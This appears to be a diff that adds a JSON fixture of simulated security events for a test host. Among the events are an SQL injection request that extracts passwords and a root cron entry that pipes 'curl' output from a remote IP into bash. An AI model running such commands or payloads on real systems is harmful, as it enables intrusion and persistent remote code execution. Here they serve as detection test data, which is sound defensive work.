@@ -1,0 +1,142 @@
+[
+  {
+    "event_id": "sys-0001-4000-8000-000000000001",
+    "schema_version": "1.0.0",
+    "event_type": "system.segfault",
+    "category": "system",
+    "timestamp": "2026-10-04T15:00:00Z",
+    "observed_at": "2026-10-04T15:00:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "system",
+    "severity": "medium",
+    "source": "/var/log/syslog",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "error_type": "segfault",
+      "process": "exploit_poc"
+    }
+  },
+  {
+    "event_id": "sys-0002-4000-8000-000000000002",
+    "schema_version": "1.0.0",
+    "event_type": "system.oom_kill",
+    "category": "system",
+    "timestamp": "2026-10-04T15:01:00Z",
+    "observed_at": "2026-10-04T15:01:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "system",
+    "severity": "medium",
+    "source": "/var/log/syslog",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "error_type": "oom_kill",
+      "process": "node"
+    }
+  },
+  {
+    "event_id": "sys-0003-4000-8000-000000000003",
+    "schema_version": "1.0.0",
+    "event_type": "system.log_tampering",
+    "category": "system",
+    "timestamp": "2026-10-04T15:05:00Z",
+    "observed_at": "2026-10-04T15:05:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "system",
+    "severity": "critical",
+    "source": "file_watcher",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "action": "truncated",
+      "current_size": 0,
+      "path": "/var/log/auth.log",
+      "previous_size": 1048576
+    }
+  },
+  {
+    "event_id": "app-0001-4000-8000-000000000001",
+    "schema_version": "1.0.0",
+    "event_type": "application.web_exploit_attempt",
+    "category": "application",
+    "timestamp": "2026-10-04T15:10:00Z",
+    "observed_at": "2026-10-04T15:10:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "remote_ip=203.0.113.88",
+    "severity": "high",
+    "source": "/var/log/nginx/access.log",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "exploit_type": "sql_injection",
+      "ip": "203.0.113.88",
+      "method": "GET",
+      "status": 500,
+      "uri": "/api/users?id=1%27%20UNION%20SELECT%20null,password%20FROM%20users--"
+    }
+  },
+  {
+    "event_id": "app-0002-4000-8000-000000000002",
+    "schema_version": "1.0.0",
+    "event_type": "application.cron_added",
+    "category": "application",
+    "timestamp": "2026-10-04T15:12:00Z",
+    "observed_at": "2026-10-04T15:12:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "user=root",
+    "severity": "high",
+    "source": "crontab",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "command": "curl -s http://198.51.100.77/stage2 | bash",
+      "schedule": "*/10 * * * *",
+      "user": "root"
+    }
+  },
+  {
+    "event_id": "app-0003-4000-8000-000000000003",
+    "schema_version": "1.0.0",
+    "event_type": "application.browser_extension_installed",
+    "category": "application",
+    "timestamp": "2026-10-04T15:15:00Z",
+    "observed_at": "2026-10-04T15:15:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "browser",
+    "severity": "medium",
+    "source": "browser_extensions",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "extension_id": "malicious_extension_hash_99",
+      "home_dir": "/home/victim"
+    }
+  },
+  {
+    "event_id": "app-0004-4000-8000-000000000004",
+    "schema_version": "1.0.0",
+    "event_type": "application.media_access",
+    "category": "application",
+    "timestamp": "2026-10-04T15:20:00Z",
+    "observed_at": "2026-10-04T15:20:00Z",
+    "host_id": "be7a4e61-9c88-4fb0-a29d-43cf1812e911",
+    "hostname": "prod-srv-01",
+    "actor": "pid=3341",
+    "severity": "high",
+    "source": "/dev/video0",
+    "collector_status": "ok",
+    "related_event_ids": [],
+    "details": {
+      "device": "camera",
+      "device_path": "/dev/video0",
+      "pid": "3341"
+    }
+  }
+]
